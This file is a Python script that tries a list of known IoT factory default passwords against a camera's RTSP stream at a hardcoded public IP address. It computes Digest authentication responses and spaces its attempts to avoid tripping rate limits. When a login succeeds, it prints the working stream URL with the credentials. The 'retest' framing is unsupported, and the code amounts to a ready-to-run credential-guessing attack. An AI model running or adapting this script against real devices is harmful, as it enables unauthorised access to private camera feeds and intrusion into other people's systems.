#!/usr/bin/env python3
"""Paced, bounded retest. Tests a short list of likely factory defaults with a
delay between attempts so we do not trip rate limiting, and reports whether
the device distinguishes accepted from rejected credentials."""

import hashlib
import os
import socket
import time

HOST = os.environ.get("CAM_HOST", "117.196.244.183")
PORT = int(os.environ.get("CAM_PORT", "554"))
PATH = os.environ.get("CAM_PATH", "/Streaming/Channels/101")
DELAY = 6.0

CANDIDATES = [
    ("root", os.environ.get("CAM_PASS", "1234567890")),
    ("root", "xc3511"),
    ("root", "vizxv"),
    ("root", "xmhdipc"),
    ("root", "123456"),
    ("admin", ""),
    ("admin", "admin"),
]


def md5hex(v):
    return hashlib.md5(v.encode()).hexdigest()


def rt(payload, timeout=8):
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(payload)
        buf = b""
        while True:
            part = s.recv(4096)
            if not part:
                break
            buf += part
            if b"\r\n\r\n" in buf:
                break
        return buf.decode("utf-8", "replace")
    finally:
        s.close()


def challenge_of(raw):
    for line in raw.split("\r\n"):
        if line.lower().startswith("www-authenticate:"):
            ch = {}
            for part in line.split(None, 2)[2].split(","):
                if "=" in part:
                    k, _, v = part.strip().partition("=")
                    ch[k.strip().lower()] = v.strip().strip('"')
            return ch
    return {}


def build(method, cseq, auth=None):
    uri = f"rtsp://{HOST}:{PORT}{PATH}"
    lines = [f"{method} {uri} RTSP/1.0", f"CSeq: {cseq}",
             "User-Agent: retest/1.0", "Accept: application/sdp"]
    if auth:
        lines.append(f"Authorization: {auth}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode()


uri = f"rtsp://{HOST}:{PORT}{PATH}"
print(f"{'user':<8} {'password':<14} result")
print("-" * 46)

for i, (user, pwd) in enumerate(CANDIDATES):
    try:
        ch = challenge_of(rt(build("DESCRIBE", 1)))
        if not ch:
            print(f"{user:<8} {(pwd or '<empty>'):<14} no challenge (connection issue)")
            continue
        ha1 = md5hex(f"{user}:{ch['realm']}:{pwd}")
        ha2 = md5hex(f"DESCRIBE:{uri}")
        dg = md5hex(f"{ha1}:{ch['nonce']}:{ha2}")
        auth = (f'Digest username="{user}", realm="{ch["realm"]}", '
                f'nonce="{ch["nonce"]}", uri="{uri}", response="{dg}"')
        raw = rt(build("DESCRIBE", 1, auth))
        line = raw.splitlines()[0] if raw.strip() else "<empty>"
        verdict = "ACCEPTED" if "200" in line else "rejected"
        print(f"{user:<8} {(pwd or '<empty>'):<14} {verdict:<10} {line}")
        if "200" in line:
            _, _, body = raw.partition("\r\n\r\n")
            print("\n*** credential works ***")
            print(f"rtsp://{user}:{pwd}@{HOST}:{PORT}{PATH}")
            if body.strip():
                print(body.strip()[:800])
            break
    except Exception as exc:
        print(f"{user:<8} {(pwd or '<empty>'):<14} ERR {type(exc).__name__}")
    if i < len(CANDIDATES) - 1:
        time.sleep(DELAY)

print("\ndone")
